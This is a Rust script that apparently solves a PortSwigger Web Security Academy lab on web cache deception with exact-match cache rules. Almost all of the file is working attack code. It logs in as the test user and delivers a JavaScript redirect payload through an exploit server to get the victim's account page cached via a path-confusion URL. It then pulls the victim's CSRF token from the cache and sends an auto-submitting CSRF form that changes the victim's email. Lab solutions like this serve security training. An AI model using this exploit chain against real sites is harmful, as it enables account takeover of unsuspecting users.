/****************************************************************************************
*
* Lab: Exploiting exact-match cache rules for web cache deception
*
* Hack Steps:
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie
*      3. Log in as wiener
*      4. Send malicious payload to the victim to force caching their profile
*      5. Wait 1 seconds to ensure the cache is populated
*      6. Fetch carlos profile page from the cache
*      7. Extract the csrf token
*      8. Send malicious payload to the victim to force changing their eamil address
*
*
*****************************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    thread,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a28006304e1130780f30dd20030004c.web-security-academy.net";
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a5500d10493135480f50caf019e0004.exploit-server.net"; // Change this to your exploit server URL

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch(LAB_URL, "/login");

    println!("{}", "OK".green());
    print!("{}", "â¦—2â¦˜ Extracting the csrf token and session cookie.. ",);
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Logging in as wiener.. ",);
    flush_terminal();

    let wiener_login = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("â¦—4â¦˜ Sending malicious payload to the victim to force caching their profile.. ");
    flush_terminal();

    let payload = format!(
        r###"<script>
                location = "{LAB_URL}/my-account;%2f%2e%2e%2ffavicon.ico";
            </script>"###
    );
    deliver_exploit_to_victim(&payload);
    fetch(EXPLOIT_SERVER_URL, "/deliver-to-victim");

    println!("{}", "OK".green());
    print!("â¦—5â¦˜ Waiting 1 seconds to ensure the cache is populated.. ");
    flush_terminal();

    thread::sleep(Duration::from_secs(1)); // # you may need to change this to 2 or 3 seconds

    println!("{}", "OK".green());
    print!("â¦—6â¦˜ Fetching carlos profile page from the cache.. ");
    flush_terminal();

    session = get_session_cookie(&wiener_login);
    let carlos_profile = fetch_with_session(
        LAB_URL,
        "/my-account;%2f%2e%2e%2ffavicon.ico",
        &session,
    );

    println!("{}", "OK".green());
    print!("â¦—7â¦˜ Extracting the csrf token.. ");
    flush_terminal();

    csrf_token = get_csrf_token(carlos_profile);

    println!("{}", "OK".green());
    print!("â¦—8â¦˜ Sending malicioius payload to the victim to froce changing his email address.. ");
    flush_terminal();

    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf_token}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>[
                </body>
            </html>   
      "###
    );
    deliver_exploit_to_victim(&payload);
    fetch(EXPLOIT_SERVER_URL, "/deliver-to-victim");

    println!("{}", "OK".green());
    println!("ðŸ—¹ The victim's email will be changed after they trigger the exploit");
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(url: &str, path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{url}{path}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(url: &str, path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{url}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()))
}

fn deliver_exploit_to_victim(payload: &str) {
    let client = build_web_client();
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    client
        .post(EXPLOIT_SERVER_URL)
        .header(
            "user-agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        )
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to deliver the exploit to the victim".red()
        ));
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "â¦—!â¦˜ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
